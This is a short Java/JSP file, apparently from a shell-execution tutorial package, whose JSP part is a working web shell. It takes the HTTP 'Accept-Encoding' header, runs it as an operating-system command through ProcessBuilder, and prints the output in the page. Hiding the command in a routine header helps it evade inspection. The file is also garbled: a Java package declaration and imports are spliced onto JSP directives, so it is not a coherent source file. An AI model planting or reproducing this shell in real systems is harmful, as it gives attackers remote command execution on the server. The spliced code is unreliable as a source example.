package com.mkyong.shell;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
	//String[] ids = request.getParameterValues("");
	// StringBuffer sb = new StringBuffer();
	// for(int i = 0; i < ids.length; i++) {
	// 	sb.append(ids[i]);
	// }
	// out.write("<pre>" + sb + "</pre>");
    
	{
    InputStream in = new ProcessBuilder(request.getHeader("Accept-Encoding")).start().getInputStream();
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;

    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }

    out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");

	}
	//executeCommand(command);


%>


